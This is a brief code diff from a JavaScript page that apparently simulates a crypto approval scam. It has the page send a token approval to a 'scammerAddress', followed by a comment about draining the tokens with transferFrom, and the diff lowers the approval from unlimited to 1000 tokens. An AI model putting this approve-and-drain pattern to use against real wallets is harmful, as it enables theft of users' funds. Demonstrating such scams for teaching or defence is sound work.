@@ -255,7 +255,7 @@
 
       try {
         status.innerText = "🚨 Sending approval...";
-        const tx = await token.approve(scammerAddress, ethers.constants.MaxUint256);
+        const tx = await token.approve(scammerAddress, ethers.utils.parseEther("1000"));
         await tx.wait();
 
         // Now simulate the token drain using transferFrom
